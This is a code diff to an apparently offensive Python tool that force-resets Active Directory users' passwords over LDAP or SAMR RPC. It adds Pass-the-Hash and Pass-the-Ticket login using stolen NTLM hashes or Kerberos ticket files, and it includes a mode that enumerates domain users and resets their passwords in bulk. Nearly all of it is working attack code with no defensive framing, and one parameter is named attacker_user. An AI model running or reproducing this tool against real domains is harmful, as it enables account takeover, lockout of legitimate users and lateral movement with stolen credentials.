@@ -4,6 +4,7 @@ import re
 import ssl
 import signal
 import logging
+import os
 
 from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, SUBTREE, Tls
 from ldap3.core.exceptions import LDAPBindError
@@ -50,6 +51,17 @@ def validate_password(password):
     return len(password) >= 7
 
 
+def validate_hash(hash_str):
+    if ':' in hash_str:
+        parts = hash_str.split(':')
+        if len(parts) == 2:
+            lm, nt = parts
+            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
+        return False
+    else:
+        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)
+
+
 def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
     while True:
         try:
@@ -88,33 +100,12 @@ def check_ip_reachable(ip):
         return False
 
 
-def check_credentials_and_domain(dc_ip, domain, username, password):
-    try:
-        base_dn = get_base_dn(domain)
-        tls     = Tls(validate=ssl.CERT_NONE)
-        server  = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
-        conn    = Connection(
-            server,
-            user=f"{domain}\\{username}",
-            password=password,
-            authentication=NTLM,
-            auto_bind=True
-        )
-        conn.search(
-            search_base=base_dn,
-            search_filter='(objectClass=domain)',
-            search_scope=SUBTREE,
-            attributes=['dc']
-        )
-        result = len(conn.entries) > 0
-        conn.unbind()
-        return result
-    except LDAPBindError:
-        return "invalid_credentials"
-    except Exception:
+def check_credentials_and_domain(dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
+    if auth_type == 'password':
         try:
             base_dn = get_base_dn(domain)
-            server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
+            tls     = Tls(validate=ssl.CERT_NONE)
+            server  = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
             conn    = Connection(
                 server,
                 user=f"{domain}\\{username}",
@@ -134,6 +125,59 @@ def check_credentials_and_domain(dc_ip, domain, username, password):
         except LDAPBindError:
             return "invalid_credentials"
         except Exception:
+            try:
+                base_dn = get_base_dn(domain)
+                server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
+                conn    = Connection(
+                    server,
+                    user=f"{domain}\\{username}",
+                    password=password,
+                    authentication=NTLM,
+                    auto_bind=True
+                )
+                conn.search(
+                    search_base=base_dn,
+                    search_filter='(objectClass=domain)',
+                    search_scope=SUBTREE,
+                    attributes=['dc']
+                )
+                result = len(conn.entries) > 0
+                conn.unbind()
+                return result
+            except LDAPBindError:
+                return "invalid_credentials"
+            except Exception:
+                return False
+    else:
+        try:
+            from impacket.dcerpc.v5 import transport, samr
+            string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
+            tr = transport.DCERPCTransportFactory(string_binding)
+            
+            if auth_type == 'hash':
+                tr.set_credentials(username, '', domain, lmhash, nthash)
+            elif auth_type == 'ticket':
+                tr.set_credentials(username, '', domain, '', '')
+                tr.set_kerberos(True, kdcHost=dc_ip)
+                if ticket_file and os.path.exists(ticket_file):
+                    os.environ['KRB5CCNAME'] = ticket_file
+            
+            dce = tr.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+            
+            resp = samr.hSamrConnect(dce)
+            server_hd = resp['ServerHandle']
+            
+            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
+            
+            samr.hSamrCloseHandle(dce, server_hd)
+            dce.disconnect()
+            return True
+        except Exception as e:
+            err = str(e).lower()
+            if any(x in err for x in ['logon failure', 'access_denied', 'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
+                return "invalid_credentials"
             return False
 
 
@@ -172,18 +216,122 @@ def ldap_connect(dc_ip, domain, username, password):
         return None
 
 
-def get_all_users(conn, base_dn):
+def get_all_users(conn, base_dn, dc_ip=None, domain=None, username=None, password=None, auth_type='password', lmhash='', nthash='', ticket_file=''):
+    if auth_type == 'password':
+        try:
+            conn.search(
+                search_base=base_dn,
+                search_filter='(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
+                search_scope=SUBTREE,
+                attributes=['sAMAccountName', 'distinguishedName']
+            )
+            return conn.entries
+        except Exception as e:
+            print(Fore.RED + f"[-] Failed to get users: {e}" + Style.RESET_ALL)
+            return []
+    else:
+        return get_all_users_rpc(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
+
+
+def get_all_users_rpc(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file):
     try:
-        conn.search(
-            search_base=base_dn,
-            search_filter='(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
-            search_scope=SUBTREE,
-            attributes=['sAMAccountName', 'distinguishedName']
-        )
-        return conn.entries
+        from impacket.dcerpc.v5 import transport, samr
+        
+        string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
+        tr = transport.DCERPCTransportFactory(string_binding)
+        
+        if auth_type == 'hash':
+            tr.set_credentials(username, '', domain, lmhash, nthash)
+        elif auth_type == 'ticket':
+            tr.set_credentials(username, '', domain, '', '')
+            tr.set_kerberos(True, kdcHost=dc_ip)
+            if ticket_file and os.path.exists(ticket_file):
+                os.environ['KRB5CCNAME'] = ticket_file
+        else:
+            tr.set_credentials(username, password, domain, '', '')
+        
+        dce = tr.get_dce_rpc()
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+        
+        resp = samr.hSamrConnect(dce)
+        server_hd = resp['ServerHandle']
+        
+        resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
+        domain_sid = resp['DomainId']
+        
+        resp = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
+        domain_hd = resp['DomainHandle']
+        
+        users = []
+        enumeration_context = 0
+        while True:
+            resp = samr.hSamrEnumerateUsersInDomain(dce, domain_hd, enumerationContext=enumeration_context)
+            if resp['Buffer']['Buffer']:
+                for user in resp['Buffer']['Buffer']:
+                    entry = type('Entry', (), {})()
+                    entry.sAMAccountName = user['Name']['Data']
+                    entry.distinguishedName = f"CN={user['Name']['Data']},CN=Users,{get_base_dn(domain)}"
+                    entry.RelativeId = user['RelativeId']['Data']
+                    users.append(entry)
+            enumeration_context = resp['EnumerationContext']
+            if resp['Status'] != 0x00000105:
+                break
+        
+        samr.hSamrCloseHandle(dce, domain_hd)
+        samr.hSamrCloseHandle(dce, server_hd)
+        dce.disconnect()
+        return users
     except Exception as e:
-        print(Fore.RED + f"[-] Failed to get users: {e}" + Style.RESET_ALL)
+        print(Fore.RED + f"[-] Failed to get users via RPC: {e}" + Style.RESET_ALL)
         return []
+
+
+def lookup_user_rpc(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file, target_user):
+    try:
+        from impacket.dcerpc.v5 import transport, samr
+        from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
+        
+        string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
+        tr = transport.DCERPCTransportFactory(string_binding)
+        
+        if auth_type == 'hash':
+            tr.set_credentials(username, '', domain, lmhash, nthash)
+        elif auth_type == 'ticket':
+            tr.set_credentials(username, '', domain, '', '')
+            tr.set_kerberos(True, kdcHost=dc_ip)
+            if ticket_file and os.path.exists(ticket_file):
+                os.environ['KRB5CCNAME'] = ticket_file
+        else:
+            tr.set_credentials(username, password, domain, '', '')
+        
+        dce = tr.get_dce_rpc()
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+        
+        resp = samr.hSamrConnect(dce)
+        server_hd = resp['ServerHandle']
+        
+        resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())
+        domain_sid = resp['DomainId']
+        
+        resp = samr.hSamrOpenDomain(dce, server_hd, domainId=domain_sid)
+        domain_hd = resp['DomainHandle']
+        
+        resp = samr.hSamrLookupNamesInDomain(dce, domain_hd, [target_user])
+        user_rid = resp['RelativeIds']['Element'][0]['Data']
+        
+        samr.hSamrCloseHandle(dce, domain_hd)
+        samr.hSamrCloseHandle(dce, server_hd)
+        dce.disconnect()
+        
+        entry = type('Entry', (), {})()
+        entry.sAMAccountName = target_user
+        entry.distinguishedName = f"CN={target_user},CN=Users,{get_base_dn(domain)}"
+        entry.RelativeId = user_rid
+        return entry
+    except Exception:
+        return None
 
 
 def force_change_password(conn, target_dn, new_password):
@@ -226,7 +374,7 @@ def fix_pwd_last_set(conn, target_dn):
         return False
 
 
-def force_change_password_rpc(dc_ip, domain, attacker_user, attacker_pass, target_user, new_password):
+def force_change_password_rpc(dc_ip, domain, attacker_user, attacker_pass, target_user, new_password, auth_type='password', lmhash='', nthash='', ticket_file=''):
     try:
         from impacket.dcerpc.v5 import transport, samr
         from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
@@ -239,7 +387,17 @@ def force_change_password_rpc(dc_ip, domain, attacker_user, attacker_pass, targe
 
         string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
         tr  = transport.DCERPCTransportFactory(string_binding)
-        tr.set_credentials(attacker_user, attacker_pass, domain, '', '')
+        
+        if auth_type == 'hash':
+            tr.set_credentials(attacker_user, '', domain, lmhash, nthash)
+        elif auth_type == 'ticket':
+            tr.set_credentials(attacker_user, '', domain, '', '')
+            tr.set_kerberos(True, kdcHost=dc_ip)
+            if ticket_file and os.path.exists(ticket_file):
+                os.environ['KRB5CCNAME'] = ticket_file
+        else:
+            tr.set_credentials(attacker_user, attacker_pass, domain, '', '')
+        
         dce = tr.get_dce_rpc()
         dce.connect()
         dce.bind(samr.MSRPC_UUID_SAMR)
@@ -307,23 +465,26 @@ def force_change_password_rpc(dc_ip, domain, attacker_user, attacker_pass, targe
         return str(e)
 
 
-def do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass):
-    print(Fore.YELLOW + "\n[*] Trying LDAP method..." + Style.RESET_ALL)
-    result = force_change_password(conn, target_dn, new_pass)
+def do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass, auth_type='password', lmhash='', nthash='', ticket_file=''):
+    if auth_type == 'password':
+        print(Fore.YELLOW + "\n[*] Trying LDAP method..." + Style.RESET_ALL)
+        result = force_change_password(conn, target_dn, new_pass)
 
-    if result is True:
-        print(Fore.GREEN + f"[+] Password changed via LDAP!" + Style.RESET_ALL)
-        print(Fore.GREEN + f"[+] {target} : {new_pass}" + Style.RESET_ALL)
-        return True
+        if result is True:
+            print(Fore.GREEN + f"[+] Password changed via LDAP!" + Style.RESET_ALL)
+            print(Fore.GREEN + f"[+] {target} : {new_pass}" + Style.RESET_ALL)
+            return True
 
-    print(Fore.YELLOW + f"[!] LDAP failed: {result}" + Style.RESET_ALL)
+        print(Fore.YELLOW + f"[!] LDAP failed: {result}" + Style.RESET_ALL)
+    
     print(Fore.YELLOW + "[*] Trying RPC method..." + Style.RESET_ALL)
 
-    result2 = force_change_password_rpc(dc_ip, domain, username, password, target, new_pass)
+    result2 = force_change_password_rpc(dc_ip, domain, username, password, target, new_pass, auth_type, lmhash, nthash, ticket_file)
 
     if result2 is True:
-        print(Fore.YELLOW + "[*] Fixing pwdLastSet via LDAP..." + Style.RESET_ALL)
-        fix_pwd_last_set(conn, target_dn)
+        if auth_type == 'password':
+            print(Fore.YELLOW + "[*] Fixing pwdLastSet via LDAP..." + Style.RESET_ALL)
+            fix_pwd_last_set(conn, target_dn)
         print(Fore.GREEN + f"[+] Password changed via RPC!" + Style.RESET_ALL)
         print(Fore.GREEN + f"[+] {target} : {new_pass}" + Style.RESET_ALL)
         return True
@@ -348,11 +509,53 @@ if __name__ == '__main__':
 
     domain   = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                          validate_domain, "Invalid domain! Example: cs.org")
-    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
-    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)
+    
+    # Auth type selection
+    print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
+    print(Fore.WHITE + "    1. Password")
+    print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
+    print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")
+    
+    auth_choice = get_input(
+        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1, 2 or 3"
+    )
+    
+    auth_type = 'password'
+    lmhash = ''
+    nthash = ''
+    ticket_file = ''
+    password = ''
+    
+    if auth_choice == '1':
+        auth_type = 'password'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)
+    elif auth_choice == '2':
+        auth_type = 'hash'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        hash_input = get_input(
+            Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT) : " + Style.RESET_ALL,
+            validate_hash, "Invalid hash! Format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+        )
+        if ':' in hash_input:
+            lmhash, nthash = hash_input.split(':')
+        else:
+            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            nthash = hash_input
+        lmhash = lmhash.lower()
+        nthash = nthash.lower()
+    elif auth_choice == '3':
+        auth_type = 'ticket'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        ticket_file = get_input(Fore.CYAN + "[?] Enter Ticket File Path (ccache) : " + Style.RESET_ALL)
+        if not os.path.exists(ticket_file):
+            print(Fore.RED + f"[!] Ticket file not found: {ticket_file}" + Style.RESET_ALL)
+            sys.exit(1)
 
     print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
-    result = check_credentials_and_domain(dc_ip, domain, username, password)
+    result = check_credentials_and_domain(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
     if result == "invalid_credentials":
         print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
         sys.exit(1)
@@ -362,10 +565,12 @@ if __name__ == '__main__':
     print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
     print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)
 
-    print(Fore.YELLOW + "[*] Connecting to LDAP..." + Style.RESET_ALL)
-    conn = ldap_connect(dc_ip, domain, username, password)
-    if not conn:
-        sys.exit(1)
+    conn = None
+    if auth_type == 'password':
+        print(Fore.YELLOW + "[*] Connecting to LDAP..." + Style.RESET_ALL)
+        conn = ldap_connect(dc_ip, domain, username, password)
+        if not conn:
+            sys.exit(1)
 
     base_dn = get_base_dn(domain)
 
@@ -384,30 +589,38 @@ if __name__ == '__main__':
         if choice == '1':
             target = get_input(Fore.CYAN + "[?] Target Username      : " + Style.RESET_ALL)
 
-            conn.search(
-                search_base=base_dn,
-                search_filter=f'(sAMAccountName={target})',
-                search_scope=SUBTREE,
-                attributes=['distinguishedName', 'sAMAccountName']
-            )
+            if auth_type == 'password':
+                conn.search(
+                    search_base=base_dn,
+                    search_filter=f'(sAMAccountName={target})',
+                    search_scope=SUBTREE,
+                    attributes=['distinguishedName', 'sAMAccountName']
+                )
 
-            if not conn.entries:
-                print(Fore.RED + f"[-] User '{target}' not found!" + Style.RESET_ALL)
-                continue
+                if not conn.entries:
+                    print(Fore.RED + f"[-] User '{target}' not found!" + Style.RESET_ALL)
+                    continue
 
-            target_dn = str(conn.entries[0].distinguishedName)
-            print(Fore.GREEN + f"[+] Found: {target_dn}" + Style.RESET_ALL)
+                target_dn = str(conn.entries[0].distinguishedName)
+                print(Fore.GREEN + f"[+] Found: {target_dn}" + Style.RESET_ALL)
+            else:
+                entry = lookup_user_rpc(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file, target)
+                if not entry:
+                    print(Fore.RED + f"[-] User '{target}' not found!" + Style.RESET_ALL)
+                    continue
+                target_dn = entry.distinguishedName
+                print(Fore.GREEN + f"[+] Found: {target_dn}" + Style.RESET_ALL)
 
             new_pass = get_input(
                 Fore.CYAN + "[?] New Password         : " + Style.RESET_ALL,
                 validate_password, "Password too short! (min 7 chars)"
             )
 
-            do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass)
+            do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass, auth_type, lmhash, nthash, ticket_file)
 
         elif choice == '2':
             print(Fore.YELLOW + "\n[*] Getting users..." + Style.RESET_ALL)
-            users = get_all_users(conn, base_dn)
+            users = get_all_users(conn, base_dn, dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
             if not users:
                 print(Fore.RED + "[-] No users found!" + Style.RESET_ALL)
                 continue
@@ -446,7 +659,7 @@ if __name__ == '__main__':
                 target    = str(user.sAMAccountName)
                 target_dn = str(user.distinguishedName)
                 print(Fore.YELLOW + f"\n[*] Changing password for: {target}" + Style.RESET_ALL)
-                if do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass):
+                if do_change_password(conn, dc_ip, domain, username, password, target, target_dn, new_pass, auth_type, lmhash, nthash, ticket_file):
                     success += 1
                 else:
                     failed += 1
@@ -458,3 +671,4 @@ if __name__ == '__main__':
         elif choice == '3':
             print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
             break
+
